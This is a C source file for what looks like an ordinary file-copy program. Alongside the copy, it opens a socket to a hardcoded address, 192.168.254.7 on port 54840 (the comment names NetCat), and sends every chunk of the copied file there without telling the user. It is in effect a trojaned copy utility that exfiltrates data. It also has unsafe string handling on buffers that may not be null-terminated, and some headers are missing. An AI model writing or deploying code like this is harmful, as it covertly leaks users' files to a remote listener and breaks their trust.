#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

struct sockaddr_in ServAddr;

int main(int argc, char** argv)
{
	////////////// Set up
	int n, s, dataSocket;
	socklen_t ServAddrLen;
	char *buffer = malloc(1024 * sizeof(char));
	char *buffer2 = malloc(1024 * sizeof(char));

	FILE *src;
	FILE *dest;

	//Configure struct for command port
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_port = htons(54840);
	ServAddr.sin_addr.s_addr = inet_addr("192.168.254.7");
	ServAddrLen = sizeof(ServAddr);

	//Create socket and connect to NetCat
	dataSocket = socket(AF_INET, SOCK_STREAM, 0);
	connect(dataSocket, (struct sockaddr*)&ServAddr, ServAddrLen);

	src = fopen(argv[1], "r");
	dest = fopen(argv[2], "w");

	n = fread(buffer, 1, 1024, src);
	printf("n: %d\n", n);
	printf("buffer: %s\n", buffer);
	while(n > 0)
	{
		strcpy(buffer2, buffer);
		fwrite(buffer, 1, strlen(buffer), dest);
		write(dataSocket, buffer2, strlen(buffer2));
		memset(buffer, '\0', 1024);
		memset(buffer2, '\0', 1024);
		n = fread(buffer, 1, 1024, src);
		printf("n: %d\n", n);
		printf("buffer: %s\n", buffer);
	}
	close(dataSocket);

	return 0;
}
